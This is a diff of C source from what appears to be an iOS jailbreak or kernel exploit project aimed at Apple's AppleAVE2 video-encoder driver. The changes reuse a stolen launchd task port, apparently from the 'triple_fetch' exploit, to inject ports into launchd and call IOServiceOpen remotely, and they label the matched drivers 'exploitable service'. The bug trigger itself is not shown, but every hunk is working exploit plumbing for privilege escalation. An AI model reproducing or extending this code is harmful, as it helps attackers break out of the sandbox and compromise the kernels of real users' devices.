@@ -22,21 +22,15 @@ kern_return_t apple_ave_utils_get_connection(io_connect_t * conn_out) {
 	io_service_t service = 0;
 	io_name_t service_name;
     
-    
     ret = host_get_io_master(mach_host_self(), &master_port);
     if (KERN_SUCCESS != ret)
     {
         printf("[ERROR]: Failed getting master port");
-        goto cleanup;
+        return KERN_ABORTED;
     }
     
-    
-    // TODO: Implement this in Utilities.m instead
-    task_t task = MACH_PORT_NULL;
-    task = find_task_port_for_path("/sbin/launchd");
-    
-    mach_port_name_t remote_self = push_local_port(task, task, MACH_MSG_TYPE_COPY_SEND);
-    
+    task_t launchd_task = get_launchd_task();
+    mach_port_name_t self_port_name = get_self_port_name();
     
 	ret = IOServiceGetMatchingServices(master_port, IOServiceMatching(IOKIT_ALL_SERVICES), &itr);
 	if (KERN_SUCCESS != ret) {
@@ -53,50 +47,40 @@ kern_return_t apple_ave_utils_get_connection(io_connect_t * conn_out) {
             continue;
         }
         
-		if (strcmp(service_name, IOKIT_SERVICE_APPLE_AVE_NAME)) {
-			continue;
+        // Name differs, and so we check
+		if (strstr(service_name, "AppleAVE2Driver") || strstr(service_name, "AppleVXE380Driver")) {
+            printf("[INFO]: Found matching exploitable service: %s\n", service_name);
         } else {
-            printf("[INFO]: Found matching service for %s: %s\n", IOKIT_SERVICE_APPLE_AVE_NAME, service_name);
+            continue;
         }
         
         // Use the port from triple_fetch
-        mach_port_name_t remote_service = push_local_port(task, service, MACH_MSG_TYPE_COPY_SEND);
+        mach_port_name_t remote_service = push_local_port(launchd_task, service, MACH_MSG_TYPE_COPY_SEND);
         if(remote_service == MACH_PORT_NULL) {
             printf("[ERROR]: pushing local port to the task\n");
             return KERN_ABORTED;
         }
         
         mach_port_name_t remote_client = MACH_PORT_NULL;
-        ret = (int) call_remote(task, IOServiceOpen, 4, REMOTE_LITERAL(remote_service), REMOTE_LITERAL(remote_self), REMOTE_LITERAL(0), REMOTE_OUT_BUFFER(&remote_client, sizeof(remote_client)));
+        ret = (int) call_remote(launchd_task, IOServiceOpen, 4, REMOTE_LITERAL(remote_service), REMOTE_LITERAL(self_port_name), REMOTE_LITERAL(0), REMOTE_OUT_BUFFER(&remote_client, sizeof(remote_client)));
         if(ret != 0) {
             printf("[ERROR]: Could not remote call IOServiceOpen..\n");
             return KERN_ABORTED;
         }
         
-        connection = pull_remote_port(task, remote_client, MACH_MSG_TYPE_COPY_SEND);
+        connection = pull_remote_port(launchd_task, remote_client, MACH_MSG_TYPE_COPY_SEND);
+        break; // Stop at this point
     }
-    if (0 == connection)
-    {
+    if (0 == connection) {
         printf("[ERROR]: Service %s not found!\n", IOKIT_SERVICE_APPLE_AVE_NAME);
-        ret = KERN_ABORTED;
     } else {
-        printf("[INFO]: Connection with service %s was successfully made.\n", IOKIT_SERVICE_APPLE_AVE_NAME);
+        printf("[INFO]: Connection with service %s was successfully made.\n", service_name);
+        *conn_out = connection;
+        IOObjectRelease(itr);
+        itr = 0;
     }
-
-cleanup:
-
-	if (KERN_SUCCESS == ret)
-	{
-		*conn_out = connection;
-	}
-
-	if (itr)
-	{
-		itr = 0;
-	}
-
-	return ret;
-
+    
+    return connection == 0 ? KERN_ABORTED : KERN_SUCCESS;
 }
 
 
@@ -187,14 +171,20 @@ kern_return_t apple_ave_utils_prepare_to_encode_frames(io_connect_t conn, void *
 	
 	kern_return_t ret = KERN_SUCCESS;
 	size_t output_buffer_size = ENCODE_FRAME_OUTPUT_BUFFER_SIZE;
-
+    
+    printf("[INFO]: apple_ave_utils_prepare_to_encode_frames preparing to encode frames for connection\n");
+    
 	ret = IOConnectCallMethod(conn,
 		APPLEAVE2_EXTERNAL_METHOD_PREPARE_TO_ENCODE_FRAMES,
 		NULL, 0,
 		input_buffer, ENCODE_FRAME_INPUT_BUFFER_SIZE,
 		NULL, 0,
 		output_buffer, &output_buffer_size);
-
+    
+    if(ret != KERN_SUCCESS) {
+        printf("[ERROR]: Failed calling method (PREPARE_TO_ENCODE_FRAMES)\n");
+        return KERN_ABORTED;
+    }
 
 	return ret;	
 }
